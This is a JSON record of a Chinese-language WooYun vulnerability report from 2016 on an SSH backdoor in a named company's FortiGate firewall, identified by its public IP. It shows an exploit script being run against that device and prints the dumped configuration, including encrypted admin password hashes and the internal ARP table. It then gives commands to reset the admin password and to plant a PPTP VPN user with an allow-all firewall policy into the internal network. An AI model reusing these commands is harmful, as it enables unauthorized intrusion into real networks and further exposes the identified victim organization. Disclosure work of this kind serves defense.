{"id": 73417, "wybug_id": "wooyun-2016-0172184", "wybug_title": "FortiGate某客户防火墙存在后门可vpn入内网", "wybug_corp": "Fortinet", "wybug_author": "路人甲", "wybug_date": "2016-01-25 12:12", "wybug_open_date": "2016-01-30 12:20", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-30：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 可vpn入内网 详细说明：  ip:202.105.46.58该FortiGate防火墙存在SSH后门查了下whois确认是世纪龙信息网络有限责任公司的WHOIS Results for 202.105.46.58inetnum: 202.105.46.0 - 202.105.46.255netname: GUANGZHOU-SHIJILONG-INFOR-COdescr: GUANGZHOU SHIJILONG INFORMATION CO.country: CNadmin-c: CX204-APtech-c: CX204-APstatus: ASSIGNED NON-PORTABLEchanged: ipadm@gddc.com.cn 20041122mnt-by: MAINT-CHINANET-GDsource: APNICroot@bt:/var/www# python ft.py 202.105.46.58BC_GZ_60C # show user groupconfig user group    edit \"FSSO_Guest_Users\"        set group-type fsso-service    next    edit \"Guest-group\"        set member \"guest\"    next    edit \"admi_opt_G\"        set member \"admin_branch\"    nextendBC_GZ_60C # get sys arpAddress           Age(min)   Hardware Addr      Interface192.168.1.100     11         c0:3f:d5:e3:3d:e8 internal192.168.1.101     7          c0:3f:d5:e4:38:0c internal192.168.2.111     0          a0:86:c6:0b:53:38 wifi192.168.2.113     0          5c:f7:c3:70:8a:3a wifi202.105.46.57     0          00:25:ba:e9:c5:83 wan1BC_GZ_60C # get system statusVersion: FortiWiFi-60C v5.0,build0271,140124 (GA Patch 6)Virus-DB: 16.00560(2012-10-19 08:31)Extended DB: 1.00000(2012-10-17 15:46)IPS-DB: 4.00345(2013-05-23 00:39)IPS-ETDB: 0.00000(2001-01-01 00:00)Serial-Number: FWF60C3G13006372Botnet DB: 1.00000(2012-05-28 22:51)BIOS version: 04000031System Part-Number: P08947-06Log hard disk: AvailableInternal Switch mode: switchHostname: BC_GZ_60COperation Mode: NATCurrent virtual domain: rootMax number of virtual domains: 10Virtual domains status: 1 in NAT mode, 0 in TP modeVirtual domain configuration: disableFIPS-CC mode: disableCurrent HA mode: standaloneBranch point: 271Release Version Information: GA Patch 6System time: Wed Jan 20 18:56:54 2016BC_GZ_60C # show system adminconfig system admin    edit \"admin\"        set accprofile \"super_admin\"        set vdom \"root\"            config dashboard-tabs                edit 1                    set name \"Status\"                next                edit 2                    set columns 1                    set name \"Top Sources\"                next                edit 3                    set columns 1                    set name \"Top Destinations\"                next                edit 4                    set columns 1                    set name \"Top Applications\"                next            end            config dashboard                edit 1                    set tab-id 1                    set column 1                next                edit 2                    set widget-type licinfo                    set tab-id 1                    set column 1                next                edit 3                    set widget-type sysres                    set tab-id 1                    set column 2                next                edit 42                    set widget-type gui-features                    set tab-id 1                    set column 2                next                edit 4                    set widget-type jsconsole                    set tab-id 1                    set column 2                next                edit 5                    set widget-type alert                    set tab-id 1                    set column 2                    set top-n 10                next                edit 21                    set widget-type sessions                    set tab-id 2                    set column 1                    set top-n 25                    set sort-by msg-counts                next                edit 31                    set widget-type sessions                    set tab-id 3                    set column 1                    set top-n 25                    set sort-by msg-counts                    set report-by destination                next                edit 41                    set widget-type sessions                    set tab-id 4                    set column 1                    set top-n 25                    set sort-by msg-counts                    set report-by application                next            end        set password ENC AK1c6/7vU6fy5GXrH2O4eWJuer77FlPff9GGE8qWEXfkv4=    next     edit \"admin_branch\"        set accprofile \"opr_admin\"        set vdom \"root\"            config dashboard                edit 1                    set widget-type gui-features                    set tab-id 1                    set column 2                next            end        set password ENC AK1c0b+ocn3KOdTKwaid97NzcK/1hX+4UQeED1Kgt7RjgI=    next end 可任意重置管理员密码！具体命令config system adminedit adminset password ****end重置后即可登录为了不危及业务安全，这里不深入了具体可参考： WooYun: superalloy巧新科技FortiGate防火墻後門可登錄VPN 利用脚本http://seclists.org/fulldisclosure/2016/Jan/26另外可以建立vpn代码如下：config vpn pptpset status enableset eip 192.168.200.100set sip 192.168.200.1set usrgrp Guest-groupendconfig user localedit \"guest\"set type passwordset passwd vvppnn112233nextendconfig user groupedit \"Guest-group\"set profile \"unfiltered\"set member \"guest\"nextendconfig firewall policyedit 9set srcintf \"wan1\"set dstintf \"internal\"set srcaddr \"all\"set dstaddr \"all\"set action acceptset schedule \"always\"set service \"ANY\"nextend   漏洞证明：  BC_GZ_60C # get sys arpAddress           Age(min)   Hardware Addr      Interface192.168.1.100     11         c0:3f:d5:e3:3d:e8 internal192.168.1.101     7          c0:3f:d5:e4:38:0c internal192.168.2.111     0          a0:86:c6:0b:53:38 wifi192.168.2.113     0          5c:f7:c3:70:8a:3a wifi202.105.46.57     0          00:25:ba:e9:c5:83 wan1BC_GZ_60C # get system statusVersion: FortiWiFi-60C v5.0,build0271,140124 (GA Patch 6)Virus-DB: 16.00560(2012-10-19 08:31)Extended DB: 1.00000(2012-10-17 15:46)IPS-DB: 4.00345(2013-05-23 00:39)IPS-ETDB: 0.00000(2001-01-01 00:00)Serial-Number: FWF60C3G13006372Botnet DB: 1.00000(2012-05-28 22:51)BIOS version: 04000031System Part-Number: P08947-06Log hard disk: AvailableInternal Switch mode: switchHostname: BC_GZ_60COperation Mode: NATCurrent virtual domain: rootMax number of virtual domains: 10Virtual domains status: 1 in NAT mode, 0 in TP modeVirtual domain configuration: disableFIPS-CC mode: disableCurrent HA mode: standaloneBranch point: 271Release Version Information: GA Patch 6System time: Wed Jan 20 18:56:54 2016   修复方案：  升级防火墙   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-01-30 12:20 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}